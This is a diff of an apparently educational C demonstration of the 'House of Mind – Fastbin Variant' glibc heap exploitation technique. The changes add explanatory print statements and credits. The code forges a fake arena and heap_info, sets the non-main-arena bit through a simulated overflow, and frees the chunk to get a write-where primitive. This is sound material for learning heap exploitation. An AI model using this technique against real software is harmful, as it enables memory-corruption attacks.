@@ -5,16 +5,15 @@
 #include <stdint.h>
 
 /*
-House of Mind - Fastbin Variant by Maxwell Dulin (Strikeout) 
+
+House of Mind - Fastbin Variant
 ==========================
 
 This attack is similar to the original 'House of Mind' in that it uses
 a fake non-main arena in order to write to a new location. This
 uses the fastbin for a WRITE-WHERE primitive in the 'fastbin'
-variant of the original attack though. A newer writeup for this technique
-can be found at https://maxwelldulin.com/BlogPost?post=2257705984. 
-The original Malloc Maleficarum paper is the first occurance of 
-this technique.
+variant of the original attack though. The original write for this
+can be found at https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt with a more recent post (by me) at https://maxwelldulin.com/BlogPost?post=2257705984. 
 
 By being able to allocate an arbitrary amount of chunks, a single byte
 overwrite on a chunk size and a memory leak, we can control a super
@@ -96,14 +95,28 @@ Random perks:
   chunks. 
 - Does not brick malloc, unlike the unsorted bin attack. 
 - Only has three requirements: Infinite allocations, single byte buffer overflowand a heap memory leak. 
+
+
+
+************************************
+Written up by Maxwell Dulin (Strikeout) 
+************************************
 */
 
 int main(){
 
+	printf("House of Mind - Fastbin Variant\n");
+	puts("==================================");
+	printf("The goal of this technique is to create a fake arena\n");
+	printf("at an offset of HEAP_MAX_SIZE\n");
+	
+	printf("Then, we write to the fastbins when the chunk is freed\n");
+	printf("This creates a somewhat constrained WRITE-WHERE primitive\n");
 	// Values for the allocation information.	
 	int HEAP_MAX_SIZE = 0x4000000;
 	int MAX_SIZE = (128*1024) - 0x100; // MMap threshold: https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L635
 
+	printf("Find initial location of the heap\n");
 	// The target location of our attack and the fake arena to use
 	uint8_t* fake_arena = malloc(0x1000); 
 	uint8_t* target_loc = fake_arena + 0x30;
@@ -117,12 +130,13 @@ int main(){
 	via the 'system_mem' of the 'malloc_state'. This just needs
 	to be a value larger than our fastbin chunk.
 	*/
+	printf("Set 'system_mem' (offset 0x888) for fake arena\n");
 	fake_arena[0x888] = 0xFF;
 	fake_arena[0x889] = 0xFF; 
 	fake_arena[0x88a] = 0xFF; 
 
-
 	printf("Target Memory Address for overwrite: %p\n", target_loc);
+	printf("Must set data at HEAP_MAX_SIZE (0x%x) offset\n", HEAP_MAX_SIZE);
 
 	// Calculate the location of our fake arena
 	uint64_t new_arena_value = (((uint64_t) target_chunk) + HEAP_MAX_SIZE) & ~(HEAP_MAX_SIZE - 1);
@@ -142,10 +156,12 @@ int main(){
 	}
 
 	// Use this later to trigger craziness
+	printf("Create fastbin sized chunk to be victim of attack\n");
 	uint64_t* fastbin_chunk = malloc(0x50); // Size of 0x60
 	uint64_t* chunk_ptr = fastbin_chunk - 2; // Point to chunk instead of mem
 	printf("Fastbin Chunk to overwrite: %p\n", fastbin_chunk);
 
+	printf("Fill up the TCache so that the fastbin will be used\n");
 	// Fill the tcache to make the fastbin to be used later. 
 	uint64_t* tcache_chunks[7];
 	for(int i = 0; i < 7; i++){
@@ -154,6 +170,7 @@ int main(){
 	for(int i = 0; i < 7; i++){
 		free(tcache_chunks[i]);
 	}
+
 
 	/*
 	Create a FAKE malloc_state pointer for the heap_state
@@ -169,7 +186,7 @@ int main(){
 	write to an offset of 8 from the original value written.
 	- https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L1686
 	*/
-	printf("Setting 'ar_ptr' in heap_info struct to %p\n", fake_arena);
+	printf("Setting 'ar_ptr' (our fake arena)  in heap_info struct to %p\n", fake_arena);
 	fake_heap_info[0] = (uint64_t) fake_arena; // Setting the fake ar_ptr (arena)
 	printf("Target Write at %p prior to exploitation: 0x%x\n", target_loc, *(target_loc));
 
@@ -186,10 +203,10 @@ int main(){
 	///// Vulnerability! Overwriting the chunk size 
 	*/
 	printf("Set non-main arena bit on the fastbin chunk\n");
+	puts("NOTE: This keeps the next chunk size valid because the actual chunk size was never changed\n");
 	chunk_ptr[1] = 0x60 | 0x4; // Setting the non-main arena bit
 
 	//// End vulnerability 
-
 
 	/*
 	The offset being written to with the fastbin chunk address
@@ -202,7 +219,13 @@ int main(){
 	This is a similar concept to bk - 0x10 from the unsorted
 	bin attack. 
 	*/
-	printf("Free the fastbin chunk to cause magic to happen\n");
+
+	printf("When we free the fastbin chunk with the non-main arena bit\n");
+	printf("set, it will cause our fake 'heap_info' struct to be used.\n");
+	printf("This will dereference our fake arena location and write\n");
+	printf("the address of the heap to an offset of the arena pointer.\n");
+
+	printf("Trigger the magic by freeing the chunk!\n");
 	free(fastbin_chunk); // Trigger the madness
 
 	// For this particular fastbin chunk size, the offset is 0x28. 
